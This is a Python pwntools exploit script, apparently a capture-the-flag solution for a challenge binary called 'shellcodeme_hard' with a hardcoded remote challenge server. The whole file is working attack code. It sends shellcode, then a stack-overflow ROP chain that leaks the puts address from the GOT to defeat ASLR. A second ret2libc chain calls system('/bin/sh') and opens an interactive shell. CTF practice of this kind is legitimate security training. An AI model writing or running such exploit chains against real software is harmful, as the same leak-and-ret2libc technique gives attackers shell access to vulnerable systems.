#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
# libc 2.19
context.log_level="debug"
pwn_file="./shellcodeme_hard"
elf=ELF(pwn_file)

context.arch="amd64"
if len(sys.argv)==1:
    conn=process(pwn_file)
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    pid=conn.pid
else:
    conn=remote("shellcodeme.420blaze.in",4200)
    libc=ELF("./libc.so.6")
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

shellcode="""
here:
    pop rdi
    pop rdi
    pop rsi
    pop rsi
    pop rsi
    pop rdx
    pop rdx
    push 0x6a
    pop rdx
    syscall
    ret
"""
payload=asm(shellcode)
conn.sendlineafter("Shellcode?\n",payload)

rop="a"*0x28
rop+=p64(0x400b43)
rop+=p64(elf.got["puts"])
rop+=p64(elf.symbols["puts"])
rop+=p64(elf.symbols["_start"])
conn.sendline(rop)
libc_address=u64(conn.recvline(keepends=False).ljust(8,"\x00"))-libc.symbols["puts"]
log.debug("libc address: 0x%x"%libc_address)
debug()
shellcode="""
here:
    pop rdi
    pop rdi
    pop rsi
    pop rsi
    pop rsi
    pop rdx
    pop rdx
    push 0x6a
    pop rdx
    syscall
    ret
"""
conn.sendlineafter("Shellcode?\n",(asm(shellcode)))
rop="a"*0x28
rop+=p64(0x400b43)
rop+=p64(libc_address+libc.search("/bin/sh").next())
rop+=p64(libc_address+libc.symbols["system"])
conn.sendline(rop)
conn.interactive()
